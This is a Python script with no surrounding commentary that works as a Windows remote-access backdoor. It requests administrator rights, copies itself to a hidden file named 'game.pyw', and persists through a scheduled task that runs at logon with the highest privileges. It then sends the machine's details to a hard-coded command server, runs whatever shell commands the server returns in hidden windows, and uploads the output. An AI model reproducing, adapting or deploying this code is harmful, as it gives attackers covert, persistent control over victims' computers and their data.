import ctypes, os, shutil, socket, subprocess, sys, time, requests
SITE = "https://cript-45cq.onrender.com"
TASK = "Remote Console"
TARGET = os.path.join(os.environ.get("LOCALAPPDATA") or "", "RemoteAdmin", "game.pyw")
def pythonw():
    path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    return path if os.path.isfile(path) else sys.executable
def elevate():
    if os.name != "nt" or ctypes.windll.shell32.IsUserAnAdmin():
        return
    if ctypes.windll.shell32.ShellExecuteW(None, "runas", pythonw(), f'"{os.path.abspath(__file__)}"', None, 0) > 32:
        sys.exit()
def install():
    here = os.path.abspath(__file__)
    if here.lower() == TARGET.lower():
        return
    os.makedirs(os.path.dirname(TARGET), exist_ok=True)
    shutil.copy2(here, TARGET)
    subprocess.run(["schtasks", "/Create", "/TN", TASK, "/TR", f'"{pythonw()}" "{TARGET}"', "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"],
                   creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        os.remove(here)
    except OSError:
        pass
    os.execv(pythonw(), [pythonw(), TARGET])
def stop_others():
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    "Get-CimInstance Win32_Process -Filter \"Name='pythonw.exe'\" | Where-Object { $_.CommandLine -like '*game.pyw*' -and $_.ProcessId -ne "
                    + str(os.getpid()) + " } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"],
                   creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
def register():
    requests.post(SITE + "/sync", timeout=15, auth=("xyrielly", "BRODONTHACKME1"), json={
        "name": socket.gethostname(), "computer_name": socket.gethostname(), "root": os.path.abspath(os.sep),
        "tree": {"name": socket.gethostname(), "path": "", "loaded": True, "dirs": [], "files": []},
    }).raise_for_status()
def main():
    elevate()
    install()
    stop_others()
    last_sync = 0
    while True:
        if time.time() - last_sync >= 20:
            register()
            last_sync = time.time()
        action = requests.get(SITE + "/next-action", timeout=10, auth=("xyrielly", "BRODONTHACKME1"), params={"name": socket.gethostname()}).json()
        if action.get("action") == "console":
            try:
                process = subprocess.run(action.get("command") or "", shell=True, cwd=os.path.abspath(os.sep),
                                         stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                         timeout=120, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
                output, code = process.stdout.decode("utf-8", "replace"), process.returncode
            except Exception as error:
                output, code = f"Command failed: {error}", -1
            requests.post(SITE + "/upload-console", timeout=60, auth=("xyrielly", "BRODONTHACKME1"), data={
                "command_id": action.get("command_id"), "name": socket.gethostname(),
                "output": output[:100000], "exit_code": code,
            }).raise_for_status()
        time.sleep(1)
if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception:
            time.sleep(3)
            os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])
